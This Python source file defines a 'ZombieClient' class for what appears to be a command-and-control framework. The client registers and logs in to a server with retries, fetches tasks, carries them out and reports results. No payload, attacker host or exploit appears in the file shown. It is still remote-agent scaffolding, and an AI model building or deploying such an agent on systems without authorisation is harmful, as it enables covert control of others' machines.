#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import socket, datetime

from time import sleep


from app.components import token, config, logger, machine, task_manager


class ZombieClient:
    def __init__(self):
        # zombie has no will of its own, everything is initiated from the brain (main.py component)
        pass

    def keep_logged_in(self):
        token.keep_logged_in()

    def get_new_tasks(self):
        task_manager.get_new_tasks()

    def keep_doing_new_tasks(self):
        task_manager.keep_doing_new_tasks()

    def post_completed_tasks(self):
        task_manager.post_completed_tasks()


    def autosetup(self):
        if not config.load_credentials():
            while not token.create_user():
                sleep(config.read_setting('inet_unreach_retry'))
            logger.log('default settings loaded', 'WARNING')
            config.write_credentials()

        if not config.load_settings():
            # default settings were loaded
            config.write_settings()
            logger.log('new settings writed', 'WARNING')
        logger.log('settings and credentials loaded', 'SUCCESS')
        return True

    def run(self):
        #while True:
        if self.autosetup():
            while not token.login():
                sleep(config.read_setting('inet_unreach_retry'))
            return True


